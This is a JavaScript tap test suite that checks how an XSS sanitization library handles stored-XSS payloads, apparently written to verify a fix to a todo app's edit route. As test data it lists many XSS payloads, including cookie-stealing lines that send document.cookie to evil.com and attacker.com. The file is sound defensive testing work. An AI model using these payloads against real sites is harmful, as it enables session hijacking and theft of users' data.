const tap = require('tap');
const xss = require('xss');

/**
 * Security Tests for Stored XSS Vulnerability Remediation
 *
 * These tests verify that the XSS vulnerability in the edit route (routes/index.js)
 * has been properly remediated by sanitizing todo content before rendering.
 *
 * The vulnerability was: Stored XSS attack where malicious JavaScript could be
 * stored in the database and rendered without sanitization in the edit view.
 */

tap.test('XSS Sanitization Tests', (t) => {

  t.test('xss library should sanitize basic script tags', (t) => {
    // Test that malicious script tags are removed/neutralized
    const maliciousInput = '<script>alert("XSS")</script>';
    const sanitized = xss(maliciousInput);

    // The sanitized output should not contain the script tag
    t.notMatch(sanitized, /<script>/i, 'script tag should be removed or escaped');
    t.notMatch(sanitized, /alert/i, 'alert function call should be removed');

    t.end();
  });

  t.test('xss library should sanitize event handlers', (t) => {
    // Test that inline event handlers are removed
    const maliciousInput = '<img src=x onerror="alert(1)">';
    const sanitized = xss(maliciousInput);

    // The sanitized output should not contain the onerror handler
    t.notMatch(sanitized, /onerror/i, 'onerror event handler should be removed');
    t.notMatch(sanitized, /alert/i, 'alert function call should be removed');

    t.end();
  });

  t.test('xss library should sanitize javascript: protocol', (t) => {
    // Test that javascript: protocol in links is removed
    const maliciousInput = '<a href="javascript:alert(1)">Click me</a>';
    const sanitized = xss(maliciousInput);

    // The sanitized output should not contain javascript: protocol
    t.notMatch(sanitized, /javascript:/i, 'javascript: protocol should be removed');

    t.end();
  });

  t.test('xss library should allow safe HTML', (t) => {
    // Test that safe HTML content is preserved
    const safeInput = '<b>Bold text</b> and <i>italic text</i>';
    const sanitized = xss(safeInput);

    // Safe HTML tags should be preserved
    t.match(sanitized, /<b>/i, 'safe bold tag should be preserved');
    t.match(sanitized, /<i>/i, 'safe italic tag should be preserved');
    t.match(sanitized, /Bold text/i, 'text content should be preserved');

    t.end();
  });

  t.test('xss library should sanitize complex XSS payloads', (t) => {
    // Test various complex XSS attack vectors
    const complexPayloads = [
      '<img src=x onerror=alert(document.cookie)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<input type="text" value="test" onfocus="alert(1)">',
      '<div style="background:url(javascript:alert(1))">',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<script>eval(atob("YWxlcnQoMSk="))</script>',
    ];

    complexPayloads.forEach((payload) => {
      const sanitized = xss(payload);

      // None of these should contain executable JavaScript
      t.notMatch(sanitized, /alert\s*\(/i, `payload "${payload}" should not contain alert calls`);
      t.notMatch(sanitized, /javascript:/i, `payload "${payload}" should not contain javascript: protocol`);
      t.notMatch(sanitized, /eval\s*\(/i, `payload "${payload}" should not contain eval calls`);
    });

    t.end();
  });

  t.test('xss library should handle edge cases', (t) => {
    // Test edge cases
    t.equal(xss(''), '', 'empty string should remain empty');
    t.equal(xss('plain text'), 'plain text', 'plain text should remain unchanged');

    // Test null/undefined handling
    const nullResult = xss(null);
    t.ok(nullResult === '' || nullResult === 'null', 'null should be handled gracefully');

    t.end();
  });

  t.test('xss library should sanitize SQL and HTML combined attacks', (t) => {
    // Test payloads that combine different attack types
    const combinedPayload = '<script>fetch("/api/todos?id=1\' OR \'1\'=\'1")</script>';
    const sanitized = xss(combinedPayload);

    // The script should be removed
    t.notMatch(sanitized, /<script>/i, 'script tag should be removed');
    t.notMatch(sanitized, /fetch\s*\(/i, 'fetch call should be removed');

    t.end();
  });

  t.test('xss library should prevent DOM-based XSS', (t) => {
    // Test payloads that could lead to DOM-based XSS
    const domXssPayloads = [
      '<img src=x onerror="this.src=\'http://evil.com/?\'+document.cookie">',
      '<svg><script>alert(document.domain)</script></svg>',
      '<math><mi xlink:href="data:x,<script>alert(1)</script>">',
    ];

    domXssPayloads.forEach((payload) => {
      const sanitized = xss(payload);

      // These should not contain executable code
      t.notMatch(sanitized, /document\.cookie/i, `payload should not access cookies`);
      t.notMatch(sanitized, /document\.domain/i, `payload should not access domain`);
      t.notMatch(sanitized, /<script>/i, `payload should not contain script tags`);
    });

    t.end();
  });

  t.test('xss library should sanitize todos array scenario', (t) => {
    // Simulate the actual scenario from the vulnerability
    // where todos are fetched from database and need sanitization
    const mockTodos = [
      {
        _id: '123',
        content: 'Normal todo item',
        updated_at: new Date()
      },
      {
        _id: '456',
        content: '<script>alert("Malicious XSS")</script>',
        updated_at: new Date()
      },
      {
        _id: '789',
        content: '<img src=x onerror=alert(document.cookie)>',
        updated_at: new Date()
      }
    ];

    // Sanitize todos like in the remediated code
    const sanitizedTodos = mockTodos.map(function(todo) {
      return {
        _id: todo._id,
        content: xss(todo.content),
        updated_at: todo.updated_at
      };
    });

    // Verify normal content is preserved
    t.equal(sanitizedTodos[0].content, 'Normal todo item', 'normal content should be unchanged');

    // Verify malicious script is sanitized
    t.notMatch(sanitizedTodos[1].content, /<script>/i, 'script tag should be removed from second todo');
    t.notMatch(sanitizedTodos[1].content, /alert/i, 'alert should be removed from second todo');

    // Verify event handler is sanitized
    t.notMatch(sanitizedTodos[2].content, /onerror/i, 'onerror handler should be removed from third todo');

    // Verify all todos maintain their IDs and timestamps
    t.equal(sanitizedTodos[0]._id, '123', 'first todo ID should be preserved');
    t.equal(sanitizedTodos[1]._id, '456', 'second todo ID should be preserved');
    t.equal(sanitizedTodos[2]._id, '789', 'third todo ID should be preserved');
    t.ok(sanitizedTodos[0].updated_at, 'timestamps should be preserved');

    t.end();
  });

  t.test('xss library should prevent stored XSS in attributes', (t) => {
    // Test XSS in HTML attributes (specifically relevant to the edit.ejs template
    // which uses value="<%= todo.content %>" in line 20)
    const attributeXssPayloads = [
      '" onload="alert(1)"',
      '\' onfocus=\'alert(1)\'',
      '"><script>alert(1)</script><input type="text" value="',
      '" autofocus onfocus="alert(1)"',
    ];

    attributeXssPayloads.forEach((payload) => {
      const sanitized = xss(payload);

      // These should not break out of attributes or inject code
      t.notMatch(sanitized, /onload\s*=/i, `payload should not contain onload handler`);
      t.notMatch(sanitized, /onfocus\s*=/i, `payload should not contain onfocus handler`);
      t.notMatch(sanitized, /<script>/i, `payload should not contain script tag`);
    });

    t.end();
  });

  t.test('xss library should handle unicode and encoding attacks', (t) => {
    // Test encoded XSS payloads
    const encodedPayloads = [
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
    ];

    encodedPayloads.forEach((payload) => {
      const sanitized = xss(payload);

      // Should not contain executable script elements
      t.notMatch(sanitized, /<script>/i, `encoded payload should not contain script tags`);
      t.notMatch(sanitized, /String\.fromCharCode/i, `encoded payload should not contain fromCharCode`);
    });

    t.end();
  });

  t.test('xss library regression test - verify fix prevents original vulnerability', (t) => {
    // This test simulates the exact vulnerability scenario:
    // A malicious user stores XSS in a todo, which then gets rendered in the edit page

    const maliciousTodoContent = '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>';

    // Before the fix: this would be rendered as-is in the page
    // After the fix: this gets sanitized
    const sanitized = xss(maliciousTodoContent);

    // Verify the fix works
    t.notOk(
      sanitized.includes('<script>') && sanitized.includes('document.location'),
      'sanitized content should not contain the malicious script'
    );

    // Verify no cookie stealing is possible
    t.notMatch(sanitized, /document\.cookie/i, 'should not be able to access cookies');
    t.notMatch(sanitized, /document\.location/i, 'should not be able to redirect');

    t.end();
  });

  t.end();
});

tap.test('Integration Test Scenarios', (t) => {

  t.test('should handle multiple todos with mixed content safely', (t) => {
    // Simulate a realistic scenario with multiple todos
    const mixedTodos = [
      { _id: '1', content: 'Buy groceries', updated_at: new Date() },
      { _id: '2', content: 'Call mom <3', updated_at: new Date() },
      { _id: '3', content: '<b>Important</b>: Meeting at 3pm', updated_at: new Date() },
      { _id: '4', content: '<script>alert("pwned")</script>', updated_at: new Date() },
      { _id: '5', content: 'Fix bug in <code>app.js</code>', updated_at: new Date() },
    ];

    const sanitizedTodos = mixedTodos.map(function(todo) {
      return {
        _id: todo._id,
        content: xss(todo.content),
        updated_at: todo.updated_at
      };
    });

    // All todos should be sanitized
    t.equal(sanitizedTodos.length, 5, 'all todos should be processed');

    // Safe content should be preserved
    t.match(sanitizedTodos[0].content, /Buy groceries/, 'normal text preserved');
    t.match(sanitizedTodos[2].content, /Meeting at 3pm/, 'text in safe HTML preserved');

    // Malicious content should be neutralized
    t.notMatch(sanitizedTodos[3].content, /<script>.*alert.*<\/script>/i, 'malicious script removed');

    t.end();
  });

  t.test('should maintain data integrity after sanitization', (t) => {
    // Verify that sanitization doesn't corrupt legitimate data
    const originalTodo = {
      _id: 'test-123',
      content: 'Review PR #42 & merge if tests pass',
      updated_at: new Date('2024-01-15')
    };

    const sanitizedTodo = {
      _id: originalTodo._id,
      content: xss(originalTodo.content),
      updated_at: originalTodo.updated_at
    };

    // Data integrity checks
    t.equal(sanitizedTodo._id, originalTodo._id, 'ID should be unchanged');
    t.equal(sanitizedTodo.updated_at, originalTodo.updated_at, 'timestamp should be unchanged');
    t.match(sanitizedTodo.content, /Review PR #42/, 'legitimate content should be preserved');
    t.match(sanitizedTodo.content, /&/, 'ampersands in legitimate content should be preserved');

    t.end();
  });

  t.end();
});
